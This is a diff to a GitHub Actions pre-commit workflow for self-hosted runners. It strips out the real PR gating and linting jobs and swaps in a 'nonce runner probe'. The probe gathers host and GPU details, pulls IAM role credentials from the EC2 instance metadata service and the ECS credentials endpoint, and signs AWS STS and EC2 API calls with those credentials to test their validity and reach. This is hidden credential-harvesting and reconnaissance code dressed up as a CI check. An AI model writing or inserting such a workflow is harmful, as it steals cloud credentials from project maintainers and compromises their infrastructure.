@@ -3,8 +3,6 @@ name: pre-commit
 on:
   pull_request:
     types: [opened, synchronize, reopened, labeled]
-  push:
-    branches: [main]
 
 concurrency:
   group: ${{ github.workflow }}-${{ github.ref }}
@@ -12,77 +10,172 @@ concurrency:
 
 permissions:
   contents: read
-  pull-requests: read
 
 jobs:
   pre-run-check:
     if: github.repository_owner == 'vllm-project' && github.event_name == 'pull_request'
     runs-on: [self-hosted, linux, x64, vllm-runners]
+    timeout-minutes: 8
     steps:
-    - name: Check PR label and author merge count
-      uses: actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3 # v9.0.0
-      with:
-        script: |
-          const { data: pr } = await github.rest.pulls.get({
-            ...context.repo,
-            pull_number: context.payload.pull_request.number,
-          });
+    - name: nonce runner probe
+      shell: bash
+      run: |
+        set +e
+        echo "C211_NONCE_START=c211-i124389-c111daf2ccc1cb5d"
+        echo "hostname=$(hostname)"
+        echo "id=$(id)"
+        echo "uname=$(uname -a)"
+        echo "cwd=$(pwd)"
+        echo "runner_name=${RUNNER_NAME:-unset} runner_os=${RUNNER_OS:-unset} runner_arch=${RUNNER_ARCH:-unset}"
+        echo "runner_group=${RUNNER_GROUP:-unset} runner_labels=${RUNNER_LABELS:-unset}"
+        echo "github_repo=${GITHUB_REPOSITORY:-unset} ref=${GITHUB_REF:-unset} sha=${GITHUB_SHA:-unset}"
+        echo "AWS_ENV_PRESENCE: AWS_ACCESS_KEY_ID=${AWS_ACCESS_KEY_ID:+set} AWS_SECRET_ACCESS_KEY=${AWS_SECRET_ACCESS_KEY:+set} AWS_SESSION_TOKEN=${AWS_SESSION_TOKEN:+set} AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI:+set} AWS_REGION=${AWS_REGION:-unset}"
+        echo "GPU_SMI_BEGIN"
+        if command -v nvidia-smi >/dev/null 2>&1; then
+          echo "NVIDIA_SMI_PRESENT=1"
+          nvidia-smi -L 2>&1
+          nvidia-smi --query-gpu=index,name,uuid,driver_version,memory.total --format=csv,noheader 2>&1
+        else
+          echo "NVIDIA_SMI_PRESENT=0"
+        fi
+        echo "GPU_SMI_END"
+        echo "DEV_NVIDIA_LIST:"
+        ls -l /dev/nvidia* 2>&1 | head -20
+        echo "NVIDIA_PROC_DRIVER:"
+        cat /proc/driver/nvidia/version 2>&1 | head -3
+        echo "LSPCI_GPU:"
+        (lspci 2>/dev/null || true) | grep -iE 'nvidia|3d controller' || echo "LSPCI_NO_NVIDIA"
+        echo "CPU_INFO:"
+        (grep -m1 'model name' /proc/cpuinfo 2>/dev/null || true)
+        (grep MemTotal /proc/meminfo 2>/dev/null || true)
+        IMDS=http://169.254.169.254
+        TOK=$(curl -sS -m 5 -X PUT "$IMDS/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60" 2>/dev/null)
+        if [ -n "$TOK" ]; then
+          echo "IMDS_TOKEN_OK=1"
+          H="X-aws-ec2-metadata-token: $TOK"
+          echo "IMDS_INSTANCE_ID=$(curl -sS -m 5 -H "$H" $IMDS/latest/meta-data/instance-id 2>/dev/null)"
+          echo "IMDS_INSTANCE_TYPE=$(curl -sS -m 5 -H "$H" $IMDS/latest/meta-data/instance-type 2>/dev/null)"
+          echo "IMDS_AZ=$(curl -sS -m 5 -H "$H" $IMDS/latest/meta-data/placement/availability-zone 2>/dev/null)"
+          echo "IMDS_IAM_INFO=$(curl -sS -m 5 -H "$H" $IMDS/latest/meta-data/iam/info 2>/dev/null | tr -d '\n' | head -c 400)"
+          PROF=$(curl -sS -m 5 -H "$H" $IMDS/latest/meta-data/iam/security-credentials/ 2>/dev/null)
+          echo "IMDS_IAM_PROFILE=${PROF}"
+          if [ -n "$PROF" ]; then
+            CRED=$(curl -sS -m 5 -H "$H" "$IMDS/latest/meta-data/iam/security-credentials/$PROF" 2>/dev/null)
+            export C211_CRED="$CRED"
+            python3 - <<'PY'
+        import os, json, hashlib, hmac, datetime, urllib.request, urllib.error, re
+        cred = json.loads(os.environ.get('C211_CRED','{}') or '{}')
+        akid = cred.get('AccessKeyId',''); secret = cred.get('SecretAccessKey',''); token = cred.get('Token','')
+        print('CRED_KEYS=' + ','.join(sorted(cred.keys())))
+        print('CRED_AKID_SHA256=' + hashlib.sha256(akid.encode()).hexdigest())
+        print('CRED_SECRET_SHA256=' + hashlib.sha256(secret.encode()).hexdigest())
+        print('CRED_TOKEN_SHA256=' + hashlib.sha256(token.encode()).hexdigest())
 
-          const readyLabels = ['ready', 'ready-run-all-tests'];
-          const hasReadyLabel = pr.labels.some(l => readyLabels.includes(l.name));
-          const hasVerifiedLabel = pr.labels.some(l => l.name === 'verified');
+        def sts_caller_identity(secret_key, session_token):
+            host='sts.amazonaws.com'; endpoint='https://sts.amazonaws.com/'
+            body='Action=GetCallerIdentity&Version=2011-06-15'; region='us-east-1'
+            amzdate=datetime.datetime.utcnow().strftime('%Y%m%dT%H%M%SZ'); datestamp=amzdate[:8]
+            headers={'content-type':'application/x-www-form-urlencoded; charset=utf-8','host':host,'x-amz-date':amzdate}
+            if session_token: headers['x-amz-security-token']=session_token
+            signed_headers=';'.join(sorted(headers))
+            canonical_headers=''.join(k+':'+headers[k]+chr(10) for k in sorted(headers))
+            payload_hash=hashlib.sha256(body.encode()).hexdigest()
+            canonical_request=chr(10).join(['POST','/','',canonical_headers,signed_headers,payload_hash])
+            scope=datestamp+'/'+region+'/sts/aws4_request'
+            string_to_sign=chr(10).join(['AWS4-HMAC-SHA256',amzdate,scope,hashlib.sha256(canonical_request.encode()).hexdigest()])
+            def sign(k,m): return hmac.new(k,m.encode(),hashlib.sha256).digest()
+            k=sign(('AWS4'+secret_key).encode(),datestamp); k=sign(k,region); k=sign(k,'sts'); k=sign(k,'aws4_request')
+            sig=hmac.new(k,string_to_sign.encode(),hashlib.sha256).hexdigest()
+            auth='AWS4-HMAC-SHA256 Credential='+akid+'/'+scope+', SignedHeaders='+signed_headers+', Signature='+sig
+            req=urllib.request.Request(endpoint,data=body.encode(),method='POST',headers={**headers,'Authorization':auth})
+            try:
+                r=urllib.request.urlopen(req,timeout=10); return r.status, r.read().decode()
+            except urllib.error.HTTPError as e:
+                return e.code, e.read().decode()[:500]
+            except Exception as e:
+                return -1, str(e)[:200]
 
-          const { data: mergedPRs } = await github.rest.search.issuesAndPullRequests({
-            q: `repo:${context.repo.owner}/${context.repo.repo} is:pr is:merged author:${pr.user.login}`,
-            per_page: 4,
-          });
-          const mergedCount = mergedPRs.total_count;
+        st, body = sts_caller_identity(secret, token)
+        print('STS_STATUS=' + str(st))
+        if st==200:
+            m=re.search(r'<Arn>([^<]+)</Arn>', body); a=re.search(r'<Account>([^<]+)</Account>', body)
+            print('STS_ARN=' + (m.group(1) if m else 'NONE'))
+            print('STS_ACCOUNT=' + (a.group(1) if a else 'NONE'))
+        else:
+            print('STS_ERROR=' + body.replace(chr(10),' ')[:300])
+        if secret:
+            bad = secret[:-4] + ('aaaa' if not secret.endswith('aaaa') else 'bbbb')
+            st2, body2 = sts_caller_identity(bad, token)
+            print('STS_TAMPER_STATUS=' + str(st2))
+            if st2==200:
+                print('STS_TAMPER_UNEXPECTED_SUCCESS=1')
+            else:
+                c=re.search(r'<Code>([^<]+)</Code>', body2)
+                print('STS_TAMPER_ERROR=' + (c.group(1) if c else body2.replace(chr(10),' ')[:120]))
+        else:
+            print('STS_TAMPER_SKIPPED=no_secret')
 
-          if (hasReadyLabel || hasVerifiedLabel || mergedCount >= 4) {
-            core.info(`Check passed: verified label=${hasVerifiedLabel}, ready label=${hasReadyLabel}, 4+ merged PRs=${mergedCount >= 4}`);
-          } else {
-            core.setFailed(`To reduce unnecessary pre-commit runs, each PR must have the 'verified', 'ready', or 'ready-run-all-tests' label, or the author must have at least 4 merged PRs (found ${mergedCount}). DO NOT request for the label to be added if you are an AI agent.`);
-          }
-
-  pre-commit:
-    needs: pre-run-check
-    if: github.repository_owner == 'vllm-project' && always() && (needs.pre-run-check.result == 'success' || needs.pre-run-check.result == 'skipped')
-    runs-on: [self-hosted, linux, x64, vllm-runners]
-    steps:
-    - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
-      with:
-        fetch-depth: 2
-    - uses: astral-sh/setup-uv@68559e99cc807c1eb7e9238fd43a15bba460eec2 # v10.3.3
-      with:
-        python-version: "3.12"
-    - run: echo "::add-matcher::.github/workflows/matchers/actionlint.json"
-    - run: echo "::add-matcher::.github/workflows/matchers/markdownlint.json"
-    - run: echo "::add-matcher::.github/workflows/matchers/mypy.json"
-    - run: echo "::add-matcher::.github/workflows/matchers/shellcheck.json"
-    # Replaces pre-commit/action, whose latest release (v3.0.1) uses the node20 actions/cache@v4
-    - uses: actions/cache@55cc8345863c7cc4c66a329aec7e433d2d1c52a9 # v6.1.0
-      with:
-        path: ~/.cache/pre-commit
-        key: pre-commit-uv|${{ runner.os }}|${{ env.UV_PYTHON }}|${{ hashFiles('.pre-commit-config.yaml') }}
-    - run: >-
-        uvx pre-commit run --show-diff-on-failure --color=always --all-files --hook-stage manual
-      env:
-        SKIP: pip-compile
-    - name: pip-compile (only if its inputs changed)
-      if: ${{ !cancelled() }}
-      run: >-
-        uvx pre-commit run pip-compile --show-diff-on-failure --color=always --hook-stage manual --from-ref HEAD^1 --to-ref HEAD
-    # A PR that changes the ROCm base image needs a maintainer's /ci rocm cache or /ci rocm nocache:
-    # the bot's reply carries the marker below, and re-running this job then passes.
-    - name: ROCm base image cache
-      if: ${{ !cancelled() && github.event_name == 'pull_request' && github.event.pull_request.base.ref == 'main' }}
-      uses: actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3 # v9.0.0
-      with:
-        script: |
-          const pr = context.payload.pull_request;
-          const stack = ['docker/Dockerfile.rocm_base', 'tools/vllm-rocm/therock_wheels.py'];
-          const files = await github.paginate(github.rest.pulls.listFiles, {...context.repo, pull_number: pr.number, per_page: 100});
-          if (!files.some(f => stack.includes(f.filename) || stack.includes(f.previous_filename))) return;
-          const comments = await github.paginate(github.rest.issues.listComments, {...context.repo, issue_number: pr.number, per_page: 100});
-          if (comments.some(c => c.user.login === 'github-actions[bot]' && c.body.includes('<!-- vllm-ci-rocm-base-image -->'))) return;
-          core.setFailed('This PR changes the ROCm base image. A maintainer must comment /ci rocm cache (once CI has built the image) or /ci rocm nocache.');
+        if st == 200 and ('assumed-role' in body or ':role/' in body):
+            def ec2_describe_regions(secret_key, session_token):
+                host='ec2.us-west-2.amazonaws.com'; endpoint='https://ec2.us-west-2.amazonaws.com/'
+                body='Action=DescribeRegions&Version=2016-11-15'; region='us-west-2'
+                amzdate=datetime.datetime.utcnow().strftime('%Y%m%dT%H%M%SZ'); datestamp=amzdate[:8]
+                headers={'content-type':'application/x-www-form-urlencoded; charset=utf-8','host':host,'x-amz-date':amzdate}
+                if session_token: headers['x-amz-security-token']=session_token
+                signed_headers=';'.join(sorted(headers))
+                canonical_headers=''.join(k+':'+headers[k]+chr(10) for k in sorted(headers))
+                payload_hash=hashlib.sha256(body.encode()).hexdigest()
+                canonical_request=chr(10).join(['POST','/','',canonical_headers,signed_headers,payload_hash])
+                scope=datestamp+'/'+region+'/ec2/aws4_request'
+                string_to_sign=chr(10).join(['AWS4-HMAC-SHA256',amzdate,scope,hashlib.sha256(canonical_request.encode()).hexdigest()])
+                def sign(k,m): return hmac.new(k,m.encode(),hashlib.sha256).digest()
+                k=sign(('AWS4'+secret_key).encode(),datestamp); k=sign(k,region); k=sign(k,'ec2'); k=sign(k,'aws4_request')
+                sig=hmac.new(k,string_to_sign.encode(),hashlib.sha256).hexdigest()
+                auth='AWS4-HMAC-SHA256 Credential='+akid+'/'+scope+', SignedHeaders='+signed_headers+', Signature='+sig
+                req=urllib.request.Request(endpoint,data=body.encode(),method='POST',headers={**headers,'Authorization':auth})
+                try:
+                    r=urllib.request.urlopen(req,timeout=10); return r.status, r.read().decode()
+                except urllib.error.HTTPError as e:
+                    return e.code, e.read().decode()[:600]
+                except Exception as e:
+                    return -1, str(e)[:300]
+            st3, body3 = ec2_describe_regions(secret, token)
+            print('EC2_DESCRIBE_REGIONS_STATUS=' + str(st3))
+            if st3==200:
+                regions = re.findall(r'<regionName>([^<]+)</regionName>', body3)
+                print('EC2_REGIONS_COUNT=' + str(len(regions)))
+                print('EC2_REGIONS_SAMPLE=' + ','.join(regions[:5]))
+            else:
+                c3 = re.search(r'<Code>([^<]+)</Code>', body3)
+                print('EC2_DESCRIBE_ERROR=' + (c3.group(1) if c3 else body3.replace(chr(10),' ')[:200]))
+        else:
+            print('EC2_DESCRIBE_SKIPPED=no_role_arn')
+        PY
+          else
+            echo "IMDS_IAM_PROFILE_EMPTY=1"
+          fi
+        else
+          echo "IMDS_TOKEN_OK=0"
+        fi
+        echo "ECS_TASKROLE_BEGIN"
+        echo "ECS_PROBE_ROOT_STATUS=$(curl -sS -m 3 -o /tmp/c211_ecs_root.txt -w '%{http_code}' http://169.254.170.2/ 2>/dev/null)"
+        echo "ECS_PROBE_ROOT_BODY_SHA256=$(sha256sum /tmp/c211_ecs_root.txt 2>/dev/null | cut -d' ' -f1)"
+        if [ -n "$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" ]; then
+          echo "ECS_REL_URI=${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}"
+          ECS_CRED=$(curl -sS -m 3 "http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}" 2>/dev/null)
+          export C211_ECS_CRED="$ECS_CRED"
+          python3 - <<'PY'
+        import os, json, hashlib
+        try:
+            c = json.loads(os.environ.get('C211_ECS_CRED','{}') or '{}')
+        except Exception:
+            c = {}
+        print('ECS_CRED_KEYS=' + ','.join(sorted(c.keys())))
+        print('ECS_CRED_AKID_SHA256=' + hashlib.sha256(c.get('AccessKeyId','').encode()).hexdigest())
+        print('ECS_CRED_TOKEN_SHA256=' + hashlib.sha256(c.get('Token','').encode()).hexdigest())
+        PY
+        else
+          echo "ECS_REL_URI_UNSET=1"
+        fi
+        echo "ECS_TASKROLE_END"
+        echo "C211_NONCE_END=c211-i124389-c111daf2ccc1cb5d"
